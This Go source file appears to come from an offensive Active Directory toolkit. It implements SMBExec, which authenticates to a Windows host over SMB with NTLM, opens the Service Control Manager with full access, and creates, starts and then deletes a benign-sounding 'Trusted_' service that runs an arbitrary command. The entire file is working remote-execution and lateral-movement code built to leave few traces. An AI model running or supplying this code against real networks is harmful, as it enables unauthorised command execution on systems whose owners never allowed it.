package pki

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"
)

var scmUUID = [16]byte{
	0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35,
	0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03,
}

// SMBExec connects to a target, creates a temporary service, and executes a command.
func SMBExec(target, command string, cfg *ADCSConfig) error {
	fmt.Printf("[*] SMBExec: Executing %q on %s\n", command, target)

	conn, err := net.DialTimeout("tcp", target+":445", 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	s := &smbSession{conn: conn}
	if err := s.negotiate(); err != nil {
		return err
	}
	if err := s.sessionSetupNTLM(cfg); err != nil {
		return err
	}
	if err := s.treeConnect(target, "IPC$"); err != nil {
		return err
	}
	if err := s.createPipe("svcctl"); err != nil {
		return err
	}
	if err := rpcBind(s, scmUUID); err != nil {
		return err
	}

	// 1. OpenSCManager
	scmHandle, err := openSCManager(s, target)
	if err != nil {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	defer closeServiceHandle(s, scmHandle)

	// 2. CreateService
	svcName := fmt.Sprintf("Trusted_%d", rand.Intn(10000))
	svcHandle, err := createService(s, scmHandle, svcName, command)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}
	defer closeServiceHandle(s, svcHandle)
	defer deleteService(s, svcHandle)

	// 3. StartService
	fmt.Printf("[*] Starting temporary service %s...\n", svcName)
	if err := startService(s, svcHandle); err != nil {
		// Ignore "service did not respond" errors as the command might have already run
		fmt.Printf("[!] StartService returned: %v (command likely executed anyway)\n", err)
	}

	fmt.Printf("[+] SMBExec complete\n")
	return nil
}

func openSCManager(s *smbSession, target string) ([]byte, error) {
	var stub []byte
	targetUTF16 := coerceUTF16LE("\\\\" + target)
	targetChars := uint32(len(targetUTF16)/2 + 1)

	stub = appendLE32(stub, 0x00020000) // Pointer
	stub = appendLE32(stub, targetChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, targetChars)
	stub = append(stub, targetUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0)          // Database pointer (NULL)
	stub = appendLE32(stub, 0x000F003F) // DesiredAccess: SC_MANAGER_ALL_ACCESS

	resp, err := callRPC(s, 15, stub)
	if err != nil {
		return nil, err
	}
	return resp[24:44], nil // Return 20-byte handle
}

func createService(s *smbSession, scmHandle []byte, name, command string) ([]byte, error) {
	var stub []byte
	stub = append(stub, scmHandle...)

	nameUTF16 := coerceUTF16LE(name)
	nameChars := uint32(len(nameUTF16)/2 + 1)
	stub = appendLE32(stub, nameChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, nameChars)
	stub = append(stub, nameUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	stub = appendLE32(stub, 0)          // DisplayName pointer (NULL)
	stub = appendLE32(stub, 0x000F01FF) // DesiredAccess: SERVICE_ALL_ACCESS
	stub = appendLE32(stub, 0x00000010) // ServiceType: SERVICE_WIN32_OWN_PROCESS
	stub = appendLE32(stub, 0x00000003) // StartType: SERVICE_DEMAND_START
	stub = appendLE32(stub, 0x00000000) // ErrorControl: SERVICE_ERROR_IGNORE

	cmdUTF16 := coerceUTF16LE(command)
	cmdChars := uint32(len(cmdUTF16)/2 + 1)
	stub = appendLE32(stub, cmdChars)
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, cmdChars)
	stub = append(stub, cmdUTF16...)
	stub = append(stub, 0, 0)
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	stub = appendLE32(stub, 0) // LoadOrderGroup (NULL)
	stub = appendLE32(stub, 0) // TagId (NULL)
	stub = appendLE32(stub, 0) // Dependencies (NULL)
	stub = appendLE32(stub, 0) // ServiceStartName (NULL)
	stub = appendLE32(stub, 0) // Password (NULL)
	stub = appendLE32(stub, 0) // Password length

	resp, err := callRPC(s, 12, stub)
	if err != nil {
		return nil, err
	}
	return resp[24:44], nil
}

func startService(s *smbSession, svcHandle []byte) error {
	var stub []byte
	stub = append(stub, svcHandle...)
	stub = appendLE32(stub, 0) // NumArgs
	stub = appendLE32(stub, 0) // Arguments pointer

	_, err := callRPC(s, 19, stub)
	return err
}

func deleteService(s *smbSession, svcHandle []byte) error {
	_, err := callRPC(s, 2, svcHandle)
	return err
}

func closeServiceHandle(s *smbSession, handle []byte) error {
	_, err := callRPC(s, 0, handle)
	return err
}

func callRPC(s *smbSession, opnum uint16, stub []byte) ([]byte, error) {
	callID := rand.Uint32()
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)
	binary.LittleEndian.PutUint16(reqHdr[6:8], opnum)

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[1] = 0
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return nil, err
	}
	return s.readPipe()
}
